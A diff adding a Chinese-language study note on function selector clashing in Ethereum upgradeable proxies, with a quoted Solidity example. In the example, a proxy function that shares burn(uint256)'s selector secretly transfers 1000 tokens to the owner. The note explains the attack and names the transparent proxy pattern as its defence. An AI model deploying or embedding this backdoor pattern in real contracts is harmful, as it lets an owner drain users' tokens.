@@ -15,6 +15,71 @@ timezone: UTC+8
 ## Notes
 
 <!-- Content_START -->
+# 2025-08-17
+
+这几天准备开始细看代理模式，今天就随便放个引子好了
+
+众所周知，以太坊中对合约函数的调用是通过函数选择器（Function Selector）进行函数的区分的，计算方法也很简单：`bytes4(keccak256("Function Selector String"))`，不过由于这个选择器长度只有4个字节，那么会有很大概率存在哈希碰撞问题，也就是说一个合约中可能存在两个函数，它们的函数选择器是一样的，此时Solidity编译器在编译合约的时候会直接抛出`TypeError`错误，由此杜绝同一个合约中函数调用模糊的问题
+
+一切都非常美好，直到简单代理可升级合约的出现：我们都知道这类合约分为专门存储数据的Proxy（代理）和专门实现逻辑的Implementation（实现），一般对数据的操作都是在Proxy上通过delegatecall调用Implementation上的函数，而Proxy有的时候也会有自己的一些函数，那么问题来了：假如Proxy上和Implementation上分别存在一对Selector相同的函数，会发生什么呢？
+
+一般来说，Proxy的delegatecall放在`fallback()`中，这是因为Proxy并没有这些函数，所以合约遇到了**自己没有的**Selector就会自动调用`fallback()`，那么如果Proxy它有呢？那肯定是优先调用Proxy中对应的函数，而如果我在这个函数中进行一些恶意操作，那么用户在使用合约的时候就会遭受损失
+
+接下来给一个样例（出自[Beware of the proxy: learn how to exploit function clashing - Security - OpenZeppelin Forum](https://forum.openzeppelin.com/t/beware-of-the-proxy-learn-how-to-exploit-function-clashing/1070)）：
+
+```solidity
+pragma solidity ^0.5.0;
+
+contract Proxy {
+    
+    address public proxyOwner;
+    address public implementation;
+
+    constructor(address implementation) public {
+        proxyOwner = msg.sender;
+        _setImplementation(implementation);
+    }
+
+    modifier onlyProxyOwner() {
+        require(msg.sender == proxyOwner);
+        _;
+    }
+
+    function upgrade(address implementation) external onlyProxyOwner {
+        _setImplementation(implementation);
+    }
+
+    function _setImplementation(address imp) private {
+        implementation = imp;
+    }
+
+    function () payable external {
+        address impl = implementation;
+
+        assembly {
+            calldatacopy(0, 0, calldatasize)
+            let result := delegatecall(gas, impl, 0, calldatasize, 0, 0)
+            returndatacopy(0, 0, returndatasize)
+
+            switch result
+            case 0 { revert(0, returndatasize) }
+            default { return(0, returndatasize) }
+        }
+    }
+    
+    // This is the function we're adding now
+    function collate_propagate_storage(bytes16) external {
+        implementation.delegatecall(abi.encodeWithSignature(
+            "transfer(address,uint256)", proxyOwner, 1000
+        ));
+    }
+}
+```
+
+实际上，`burn(uint256)`和`collate_propagate_storage(bytes16)`两个函数的选择器是相同的，因此如果我们想要调用Implementation中的`burn(1)`，实际上会先首先调用Proxy的`collate_propagate_storage(0x01)`，然后根据合约逻辑调用Implementation的`transfer(proxyOwner, 1000)`，本来只想销毁1个ERC20的，这下倒好，1000个币全给转走了
+
+以上就是所谓的函数碰撞攻击（Function Clashing Exploitation），也正是因为有这类攻击被发现，现在已经出现了一个专门应对这种攻击的代理模式：透明代理模式（Transparent Proxy Pattern），至于细节等之后再写
+
 # 2025-08-15
 
 昨天坐牢太累了，回酒店倒头就睡了，今天接着坐牢也没啥空学，随便写点吧，这次是EIP-4844
